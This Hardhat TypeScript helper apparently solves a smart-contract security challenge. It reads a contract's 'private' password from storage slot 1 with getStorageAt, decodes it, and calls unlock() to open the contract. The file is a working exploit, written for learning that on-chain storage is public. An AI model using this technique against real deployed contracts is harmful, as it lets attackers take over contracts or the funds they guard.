import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  // Only the ZK gods can make things private on a public blockchain, silly goose!
  // Simply get the storage slot where `password` is stored
  // Since `password` is 256 bits and `locked` is occupying the first word, let's get slot 1
  const storage = await victim.provider.getStorageAt(victim.address, 1);
  const password = ethers.utils.parseBytes32String(storage);
  console.log(storage, password);

  await victim.unlock(ethers.utils.formatBytes32String(password));
};

export default helper;
